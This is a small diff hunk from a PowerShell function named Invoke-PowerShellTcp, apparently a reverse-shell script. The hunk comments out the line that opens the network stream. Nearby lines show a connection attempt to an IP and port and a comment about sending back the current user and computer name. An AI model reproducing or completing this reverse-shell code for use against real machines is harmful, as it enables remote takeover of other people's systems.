@@ -29,7 +29,7 @@ function Invoke-PowerShellTcp {
             #$connectionAttempt = $client.ConnectAsync($ip, $Port).Wait(1000)
             if ($connectionAttempt -eq $true) {
                 try {
-                    $stream = $client.GetStream()
+                    #$stream = $client.GetStream()
                     [byte[]]$bytes = 0..65535 | ForEach-Object { 0 } 
 
                     #Send back current username and computername
